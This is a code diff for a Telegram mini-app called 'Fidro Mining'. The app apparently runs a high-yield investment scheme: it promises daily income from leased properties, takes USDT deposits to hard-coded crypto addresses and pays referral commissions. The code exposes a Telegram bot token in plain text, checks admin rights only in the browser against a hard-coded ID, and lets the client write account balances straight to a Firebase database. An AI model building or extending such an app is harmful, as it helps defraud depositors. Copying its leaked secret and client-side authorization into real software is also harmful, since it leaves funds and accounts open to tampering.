@@ -7,6 +7,9 @@
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
+  <!-- Google Firebase Official SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <style>
     body { background-color: #F6F4EE; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
     .nav-active { color: #155E45; font-weight: 700; }
@@ -28,12 +31,15 @@
         <span class="text-[9px] text-stone-400 block leading-none">Your balance</span>
         <span class="text-xs font-bold text-[#155E45]" id="header-balance">0.50 <span class="text-[9px] text-stone-500">USD</span></span>
       </div>
-      <button onclick="switchTab('wallet')" class="w-5 h-5 rounded-full bg-[#155E45] text-white flex items-center justify-center text-xs font-bold">+</button>
+      <button onclick="switchTab('wallet')" class="w-5 h-5 rounded-full bg-[#155E45] text-white flex items-center justify-center text-xs font-bold active:scale-95 transition">+</button>
     </div>
   </header>
 
   <main class="max-w-md mx-auto px-4 pt-3">
-    <!-- TAB 1: PROPERTIES (0.50$ to 350.00$) -->
+    <!-- Real-time Live Status Banner -->
+    <div id="status-banner" class="hidden mb-3 p-3 rounded-2xl text-xs font-semibold text-center border shadow-sm"></div>
+
+    <!-- TAB 1: PROPERTIES (PLANS FROM 0.50$ TO 350.00$) -->
     <section id="tab-properties" class="tab-page">
       <div class="grid grid-cols-2 gap-2 mb-3">
         <div class="bg-white rounded-2xl p-2.5 border border-stone-200 flex items-center gap-2.5 shadow-sm">
@@ -150,7 +156,7 @@
           <img src="https://images.unsplash.com/photo-1566073771259-6a8506099945?w=700&auto=format&fit=crop&q=80" class="w-full h-44 object-cover">
           <div class="p-4">
             <h3 class="font-bold text-base text-stone-800">Oceanfront Hotel</h3>
-            <p class="text-[11px] text-stone-400">High-capacity beachside hospitality</p>
+            <p class="text-[11px] text-stone-400">High-capacity hospitality unit</p>
             <div class="grid grid-cols-2 gap-2 mt-3 pt-3 border-t border-stone-100">
               <div>
                 <span class="text-[10px] text-stone-400 block">Daily income</span>
@@ -232,10 +238,10 @@
       <div id="owned-rigs-list" class="space-y-3"></div>
     </section>
 
-    <!-- TAB 3: FRIENDS (AFFILIATE DASHBOARD) -->
+    <!-- TAB 3: FRIENDS (0.01$ BONUS & 20% COMMISSIONS) -->
     <section id="tab-friends" class="tab-page hidden">
-      <div class="text-xs font-bold text-stone-500 uppercase tracking-wider mb-1">Affiliate Program</div>
-      <h2 class="text-2xl font-bold text-[#155E45] mb-3">Invite Friends</h2>
+      <div class="text-xs font-bold text-stone-500 uppercase tracking-wider mb-1">Affiliate Circle</div>
+      <h2 class="text-2xl font-bold text-[#155E45] mb-3">Referral Program</h2>
 
       <div class="bg-gradient-to-br from-[#155E45] to-[#0E3E2E] text-white rounded-3xl p-5 mb-4 shadow-md space-y-3">
         <h3 class="font-bold text-base text-emerald-100 flex items-center gap-2">
@@ -256,7 +262,7 @@
       </div>
 
       <div class="bg-white rounded-2xl p-4 border border-stone-200 shadow-sm space-y-2">
-        <label class="text-xs font-semibold text-stone-600 block">Your Personal Referral Link</label>
+        <label class="text-xs font-semibold text-stone-600 block">Your Invitation Link</label>
         <div class="flex gap-2">
           <input id="ref-link" type="text" readonly class="w-full bg-stone-100 text-xs px-3 py-2.5 rounded-xl border border-stone-200 text-stone-600 outline-none select-all" />
           <button onclick="copyRefLink()" class="bg-[#155E45] text-white text-xs px-4 py-2.5 rounded-xl font-bold active:scale-95 transition">Copy</button>
@@ -274,22 +280,12 @@
         <span class="text-xs text-emerald-200 block">Available Balance</span>
         <div class="text-3xl font-extrabold mt-1" id="wallet-balance">0.50 USD</div>
         <div class="grid grid-cols-2 gap-3 mt-4">
-          <button onclick="showSubTab('deposit-list')" class="bg-[#F6F4EE] text-[#155E45] py-2.5 rounded-xl text-xs font-bold">+ Deposit</button>
-          <button onclick="showSubTab('withdraw-form')" class="bg-emerald-900/60 border border-emerald-400/30 text-white py-2.5 rounded-xl text-xs font-bold">Withdraw</button>
+          <button onclick="showSubTab('deposit-list')" class="bg-[#F6F4EE] text-[#155E45] py-2.5 rounded-xl text-xs font-bold active:scale-95 transition">+ Deposit</button>
+          <button onclick="showSubTab('withdraw-form')" class="bg-emerald-900/60 border border-emerald-400/30 text-white py-2.5 rounded-xl text-xs font-bold active:scale-95 transition">Withdraw</button>
         </div>
       </div>
 
-      <!-- REDEEM SECURE ADMIN APPROVAL VOUCHER -->
-      <div class="bg-white rounded-2xl p-4 border border-stone-200 shadow-sm mb-4">
-        <label class="text-xs font-bold text-stone-700 block mb-1">Enter Admin Approval Code</label>
-        <p class="text-[10px] text-stone-400 mb-2">Paste the key sent by Admin to credit your deposit or refund.</p>
-        <div class="flex gap-2">
-          <input type="text" id="voucher-code-input" placeholder="e.g. OK-50-5528794190-..." class="w-full bg-stone-50 border rounded-xl px-3 py-2 text-xs uppercase outline-none font-mono" />
-          <button onclick="redeemSecureKey()" class="bg-[#155E45] text-white text-xs px-4 py-2 rounded-xl font-bold active:scale-95 transition">Credit</button>
-        </div>
-      </div>
-
-      <!-- Deposit List -->
+      <!-- Deposit Sub-Page -->
       <div id="sub-deposit-list" class="space-y-2">
         <div onclick="openDepositModal('USDT (BEP20)', '1.00', '0x85b26f4e0906a7ee1fefdc09cd4fac5f308ec2e7')" class="bg-white p-3 rounded-2xl border border-stone-200 flex items-center justify-between cursor-pointer">
           <span class="text-xs font-bold text-stone-800">USDT (BEP20) - Min $1.00</span>
@@ -303,9 +299,13 @@
           <span class="text-xs font-bold text-stone-800">USDT (ERC20) - Min $1.00</span>
           <i class="fa-solid fa-chevron-right text-xs text-stone-300"></i>
         </div>
+        <div onclick="openDepositModal('USDT (TON)', '5.00', 'UQBA6P_n31uh6xo3HKWzKQVvkN4McRFmjY5phXFDYkAIDCJ6')" class="bg-white p-3 rounded-2xl border border-stone-200 flex items-center justify-between cursor-pointer">
+          <span class="text-xs font-bold text-stone-800">USDT (TON) - Min $5.00</span>
+          <i class="fa-solid fa-chevron-right text-xs text-stone-300"></i>
+        </div>
       </div>
 
-      <!-- Withdraw Form -->
+      <!-- Withdraw Sub-Page -->
       <div id="sub-withdraw-form" class="space-y-3 hidden">
         <div class="bg-white p-4 rounded-2xl border border-stone-200 space-y-3">
           <div>
@@ -314,6 +314,7 @@
               <option value="USDT (BEP20)">USDT (BEP20)</option>
               <option value="USDT (TRC20)">USDT (TRC20)</option>
               <option value="USDT (ERC20)">USDT (ERC20)</option>
+              <option value="USDT (TON)">USDT (TON)</option>
             </select>
           </div>
           <div>
@@ -340,23 +341,32 @@
       </div>
     </section>
 
-    <!-- TAB 6: ADMIN GENERATOR (VISIBLE ONLY TO 8181751673) -->
+    <!-- SECRET TAB 6: ADMIN ONLY (Visible ONLY to 8181751673) -->
     <section id="tab-admin" class="tab-page hidden">
-      <h2 class="text-2xl font-bold text-rose-700 mb-1">Admin Key Generator</h2>
-      <p class="text-xs text-stone-400 mb-4">No cloud needed. Create locked keys for users.</p>
+      <h2 class="text-2xl font-bold text-rose-700 mb-1">Admin Panel</h2>
+      <p class="text-xs text-stone-400 mb-4">Direct Live Verification (ID: 8181751673)</p>
 
       <div class="bg-white rounded-2xl p-4 border border-rose-200 shadow-sm space-y-3">
+        <span class="text-xs font-bold text-stone-700 block">Manage Balance & Approvals</span>
         <input type="text" id="admin-target-uid" placeholder="Target User Telegram ID" class="w-full bg-stone-50 border rounded-xl p-2.5 text-xs outline-none font-mono" />
         <input type="number" id="admin-target-amt" placeholder="Amount (e.g. 50.00)" class="w-full bg-stone-50 border rounded-xl p-2.5 text-xs outline-none" />
 
-        <button onclick="generateAdminKey()" class="w-full bg-emerald-700 text-white text-xs font-bold py-3 rounded-xl shadow-sm active:scale-95 transition">
-          🔑 Generate Cryptographic Credit Key
-        </button>
+        <div class="grid grid-cols-2 gap-2 pt-2">
+          <button onclick="adminAction('approve_deposit')" class="bg-emerald-600 text-white text-xs font-bold py-2.5 rounded-xl shadow-sm active:scale-95 transition">
+            ✅ Credit Deposit
+          </button>
+          <button onclick="adminAction('reject_deposit')" class="bg-rose-600 text-white text-xs font-bold py-2.5 rounded-xl shadow-sm active:scale-95 transition">
+            ❌ Reject Deposit
+          </button>
+        </div>
 
-        <div id="admin-result-box" class="hidden mt-3 p-3 bg-stone-50 rounded-xl border space-y-2">
-          <span class="text-[10px] font-bold text-stone-500 uppercase block">Generated Locked Key (Tap to Copy):</span>
-          <code id="admin-generated-key" class="text-xs font-mono font-bold text-emerald-800 break-all select-all block bg-white p-2 rounded-lg border"></code>
-          <button onclick="copyAdminKey()" class="w-full bg-[#155E45] text-white py-2 rounded-lg text-xs font-semibold">Copy Key & Send to User</button>
+        <div class="grid grid-cols-2 gap-2 pt-1 border-t border-stone-100">
+          <button onclick="adminAction('approve_withdraw')" class="bg-indigo-600 text-white text-xs font-bold py-2.5 rounded-xl shadow-sm active:scale-95 transition">
+            ✅ Confirm Payout
+          </button>
+          <button onclick="adminAction('refund_withdraw')" class="bg-amber-600 text-white text-xs font-bold py-2.5 rounded-xl shadow-sm active:scale-95 transition">
+            ↩️ Refund Withdraw
+          </button>
         </div>
       </div>
     </section>
@@ -408,7 +418,13 @@
   <script>
     const BOT_TOKEN = "8770511886:AAEO0HvJWZOI1WbH75nm8Esx7n88Cfms9fw";
     const ADMIN_ID = "8181751673";
-    const SECRET_SALT = "FIDRO_MINING_SECURE_SALT_9981";
+
+    // Direct Firebase Setup (Zero Cloudflare needed!)
+    const firebaseConfig = {
+      databaseURL: "https://fidromining-default-rtdb.firebaseio.com"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
     let currentUserId = '8181751673';
     let currentUserHandle = '@Biilget';
@@ -426,16 +442,59 @@
     document.getElementById('user-tg-id').innerText = currentUserId;
     document.getElementById('ref-link').value = `https://t.me/Fidromining_bot/app?startapp=${currentUserId}`;
 
+    // Security Check: Reveal Secret Admin Tab ONLY to you
     if (String(currentUserId) === String(ADMIN_ID)) {
       document.getElementById('btn-admin').classList.remove('hidden');
     }
 
-    let balance = parseFloat(localStorage.getItem('fidro_bal_' + currentUserId)) || 0.50;
+    let balance = 0.50;
     let ownedProperties = JSON.parse(localStorage.getItem('fidro_props_' + currentUserId) || '[]');
     let currentCoin = '';
     let currentMin = 1.00;
 
-    updateUI();
+    // Direct Real-time Firebase Listener
+    const userRef = db.ref('users/' + currentUserId);
+    userRef.on('value', (snap) => {
+      const data = snap.val();
+      const banner = document.getElementById('status-banner');
+
+      if (data) {
+        if (data.balance !== undefined) {
+          balance = parseFloat(data.balance);
+          updateUI();
+        }
+
+        if (data.depositStatus === 'pending') {
+          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-amber-50 border-amber-200 text-amber-800 shadow-sm";
+          banner.innerText = "⏳ Deposit Pending: Waiting for admin approval";
+          banner.classList.remove('hidden');
+        } else if (data.depositStatus === 'approved') {
+          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-emerald-50 border-emerald-200 text-[#155E45] shadow-sm";
+          banner.innerText = "✅ Deposit Confirmed & Credited!";
+          banner.classList.remove('hidden');
+        } else if (data.depositStatus === 'rejected') {
+          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-rose-50 border-rose-200 text-rose-800 shadow-sm";
+          banner.innerText = "❌ Deposit Rejected (Invalid TXID)";
+          banner.classList.remove('hidden');
+        }
+
+        if (data.withdrawStatus === 'pending') {
+          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-amber-50 border-amber-200 text-amber-800 shadow-sm";
+          banner.innerText = "⏳ Withdrawal Pending: Admin processing payout";
+          banner.classList.remove('hidden');
+        } else if (data.withdrawStatus === 'approved') {
+          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-emerald-50 border-emerald-200 text-[#155E45] shadow-sm";
+          banner.innerText = "✅ Withdrawal Paid Out!";
+          banner.classList.remove('hidden');
+        } else if (data.withdrawStatus === 'rejected') {
+          banner.className = "mb-3 p-2.5 rounded-2xl text-xs font-semibold text-center border bg-rose-50 border-rose-200 text-rose-800 shadow-sm";
+          banner.innerText = "❌ Withdrawal Canceled: Amount Refunded to Balance";
+          banner.classList.remove('hidden');
+        }
+      } else {
+        userRef.set({ balance: 0.50, depositStatus: 'none', withdrawStatus: 'none' });
+      }
+    });
 
     function switchTab(tabId) {
       document.querySelectorAll('.tab-page').forEach(el => el.classList.add('hidden'));
@@ -465,8 +524,9 @@
         return;
       }
       balance -= price;
+      userRef.update({ balance: parseFloat(balance.toFixed(2)) });
       ownedProperties.push({ name, dailyYield });
-      saveData();
+      localStorage.setItem('fidro_props_' + currentUserId, JSON.stringify(ownedProperties));
       updateUI();
       alert(`Success! Leased ${name}.`);
     }
@@ -479,11 +539,6 @@
       document.getElementById('dash-daily').innerHTML = totalDaily.toFixed(2) + ' <span class="text-[9px] text-stone-500">USD</span>';
       document.getElementById('daily-profit').innerText = totalDaily.toFixed(2) + ' USD';
       document.getElementById('monthly-profit').innerText = (totalDaily * 30).toFixed(2) + ' USD';
-    }
-
-    function saveData() {
-      localStorage.setItem('fidro_bal_' + currentUserId, balance);
-      localStorage.setItem('fidro_props_' + currentUserId, JSON.stringify(ownedProperties));
     }
 
     function openDepositModal(coin, min, addr) {
@@ -508,7 +563,7 @@
       alert("Address copied!");
     }
 
-    // Submit Deposit: Alert sent to Admin bot
+    // Direct Telegram Alert for Deposits (NO CLOUDFLARE)
     async function submitDepositProof() {
       const amount = parseFloat(document.getElementById('deposit-tx-amount').value);
       const txid = document.getElementById('deposit-txid').value.trim();
@@ -520,7 +575,13 @@
       btn.innerText = "Submitting...";
       btn.disabled = true;
 
-      const text = `🔔 <b>NEW DEPOSIT SUBMISSION</b>\n\n👤 <b>User:</b> ${currentUserHandle}\n🆔 <b>User ID:</b> <code>${currentUserId}</code>\n💰 <b>Asset:</b> ${currentCoin}\n💵 <b>Amount:</b> $${amount.toFixed(2)} USD\n🔗 <b>TXID:</b>\n<code>${txid}</code>\n\n👉 <i>Open your Admin Tab in Mini App to approve.</i>`;
+      // Update Firebase directly
+      userRef.update({
+        depositStatus: 'pending',
+        pendingDeposit: amount
+      });
+
+      const text = `🔔 <b>NEW DEPOSIT SUBMISSION</b>\n\n👤 <b>User:</b> ${currentUserHandle}\n🆔 <b>User ID:</b> <code>${currentUserId}</code>\n💰 <b>Asset:</b> ${currentCoin}\n💵 <b>Amount:</b> $${amount.toFixed(2)} USD\n🔗 <b>TXID:</b>\n<code>${txid}</code>\n\n👉 <i>Open Admin tab in Mini App to approve.</i>`;
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -529,14 +590,14 @@
       }).catch(e => console.log(e));
 
       setTimeout(() => {
-        alert("Deposit submitted! Admin will verify and deliver your confirmation code.");
+        alert("Deposit submitted! Admin will verify and credit your balance.");
         btn.innerText = "Confirm Deposit";
         btn.disabled = false;
         closeModal();
       }, 400);
     }
 
-    // Submit Withdrawal
+    // Direct Telegram Alert for Withdrawals (NO CLOUDFLARE)
     async function submitWithdraw() {
       const amount = parseFloat(document.getElementById('withdraw-amount').value);
       const addr = document.getElementById('withdraw-address').value.trim();
@@ -546,11 +607,18 @@
       if (isNaN(amount) || amount < 1.00) return alert("Minimum withdrawal is 1.00 USD.");
       if (amount > balance) return alert("Insufficient balance.");
 
-      balance -= amount;
-      saveData();
-      updateUI();
+      const btn = document.getElementById('btn-submit-withdraw');
+      btn.innerText = "Requesting...";
+      btn.disabled = true;
 
-      const text = `🚨 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${currentUserHandle}\n🆔 <b>ID:</b> <code>${currentUserId}</code>\n💳 <b>Asset:</b> ${coin}\n💵 <b>Amount:</b> $${amount.toFixed(2)} USD\n📬 <b>Destination:</b>\n<code>${addr}</code>`;
+      const newBal = parseFloat((balance - amount).toFixed(2));
+      userRef.update({
+        balance: newBal,
+        withdrawStatus: 'pending',
+        pendingWithdraw: amount
+      });
+
+      const text = `🚨 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${currentUserHandle}\n🆔 <b>User ID:</b> <code>${currentUserId}</code>\n💳 <b>Asset:</b> ${coin}\n💵 <b>Amount:</b> $${amount.toFixed(2)} USD\n📬 <b>Destination:</b>\n<code>${addr}</code>`;
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -558,83 +626,52 @@
         body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
       }).catch(e => console.log(e));
 
-      alert("Withdrawal submitted! Balance deducted.");
-      document.getElementById('withdraw-amount').value = '';
-      document.getElementById('withdraw-address').value = '';
+      setTimeout(() => {
+        alert("Withdrawal submitted! Admin notified.");
+        document.getElementById('withdraw-amount').value = '';
+        document.getElementById('withdraw-address').value = '';
+        btn.innerText = "Request Payout";
+        btn.disabled = false;
+      }, 400);
     }
 
-    // Hash helper: impossible for regular users to forge
-    function makeHash(str) {
-      let hash = 0;
-      for (let i = 0; i < str.length; i++) {
-        hash = ((hash << 5) - hash) + str.charCodeAt(i);
-        hash |= 0;
+    // SECRET ADMIN ACTIONS (Directly updates any user in Firebase)
+    async function adminAction(actionType) {
+      if (String(currentUserId) !== String(ADMIN_ID)) {
+        return alert("Access Denied: Admin only.");
       }
-      return Math.abs(hash).toString(16).toUpperCase();
-    }
-
-    // ADMIN: Generate cryptographic key locked exclusively to that user ID
-    function generateAdminKey() {
-      if (String(currentUserId) !== String(ADMIN_ID)) return alert("Access denied.");
 
       const targetUid = document.getElementById('admin-target-uid').value.trim();
       const targetAmt = parseFloat(document.getElementById('admin-target-amt').value);
 
-      if (!targetUid) return alert("Enter target user ID.");
-      if (isNaN(targetAmt) || targetAmt <= 0) return alert("Enter amount.");
+      if (!targetUid) return alert("Please enter target User ID.");
 
-      const signature = makeHash(targetUid + targetAmt + SECRET_SALT);
-      const finalKey = `OK-${targetAmt}-${targetUid}-${signature}`;
+      const targetRef = db.ref('users/' + targetUid);
+      const snap = await targetRef.once('value');
+      const targetData = snap.val() || { balance: 0.50 };
+      let currentBal = parseFloat(targetData.balance || 0.50);
 
-      document.getElementById('admin-generated-key').innerText = finalKey;
-      document.getElementById('admin-result-box').classList.remove('hidden');
-    }
-
-    function copyAdminKey() {
-      const key = document.getElementById('admin-generated-key').innerText;
-      navigator.clipboard.writeText(key);
-      alert("Key copied! Paste this code to the user in Telegram chat.");
-    }
-
-    // USER REDEEM: Only the targeted user can redeem the key
-    function redeemSecureKey() {
-      const input = document.getElementById('voucher-code-input');
-      const val = input.value.trim().toUpperCase();
-
-      if (!val) return alert("Please enter the code.");
-
-      const usedKeys = JSON.parse(localStorage.getItem('fidro_redeemed_' + currentUserId) || '[]');
-      if (usedKeys.includes(val)) {
-        return alert("This approval code has already been redeemed.");
-      }
-
-      const parts = val.split('-');
-      if (parts.length === 4 && parts[0] === 'OK') {
-        const amt = parseFloat(parts[1]);
-        const targetUid = parts[2];
-        const signature = parts[3];
-
-        // Security Check 1: Must be this exact user
-        if (targetUid !== String(currentUserId)) {
-          return alert("Invalid: This code was issued for another Telegram account.");
-        }
-
-        // Security Check 2: Must have valid Admin cryptographic signature
-        const expectedSig = makeHash(targetUid + amt + SECRET_SALT);
-        if (signature !== expectedSig) {
-          return alert("Invalid or forged approval code.");
-        }
-
-        balance += amt;
-        usedKeys.push(val);
-        localStorage.setItem('fidro_redeemed_' + currentUserId, JSON.stringify(usedKeys));
-        saveData();
-        updateUI();
-
-        alert(`✅ Approved! $${amt.toFixed(2)} USD credited to your wallet.`);
-        input.value = '';
-      } else {
-        alert("Invalid code format.");
+      if (actionType === 'approve_deposit') {
+        if (isNaN(targetAmt) || targetAmt <= 0) return alert("Enter valid deposit amount.");
+        const newBal = parseFloat((currentBal + targetAmt).toFixed(2));
+        await targetRef.update({ balance: newBal, depositStatus: 'approved' });
+        alert(`✅ Success! Credited $${targetAmt} to User ${targetUid}. New Balance: $${newBal}`);
+        document.getElementById('admin-target-amt').value = '';
+      } 
+      else if (actionType === 'reject_deposit') {
+        await targetRef.update({ depositStatus: 'rejected' });
+        alert(`❌ Deposit rejected for User ${targetUid}.`);
+      } 
+      else if (actionType === 'approve_withdraw') {
+        await targetRef.update({ withdrawStatus: 'approved' });
+        alert(`✅ Withdrawal marked as Paid for User ${targetUid}.`);
+      } 
+      else if (actionType === 'refund_withdraw') {
+        if (isNaN(targetAmt) || targetAmt <= 0) return alert("Enter refund amount.");
+        const newBal = parseFloat((currentBal + targetAmt).toFixed(2));
+        await targetRef.update({ balance: newBal, withdrawStatus: 'rejected' });
+        alert(`↩️ Refunded $${targetAmt} back to User ${targetUid}. Balance restored to: $${newBal}`);
+        document.getElementById('admin-target-amt').value = '';
       }
     }
 
